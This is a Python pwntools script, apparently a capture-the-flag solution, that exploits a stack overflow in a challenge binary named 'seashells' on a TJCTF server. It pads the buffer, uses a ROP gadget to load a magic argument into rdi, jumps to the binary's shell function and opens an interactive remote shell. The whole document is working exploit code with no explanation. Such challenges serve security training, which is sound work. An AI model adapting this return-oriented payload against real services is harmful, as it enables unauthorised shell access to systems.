#!/usr/bin/python3

from pwn import *

#p = process('./seashells')
p = remote('p1.tjctf.org', 8009)

context.clear(arch='amd64')

binary = ELF('./seashells')
shell = binary.symbols['shell']

rop = ROP('seashells')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

payload  = b''
payload += 0x12 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(0xDEADCAFEBABEBEEF)
payload += p64(shell)

p.recvuntil('Would you like a shell?')
p.sendline(payload)

p.interactive()
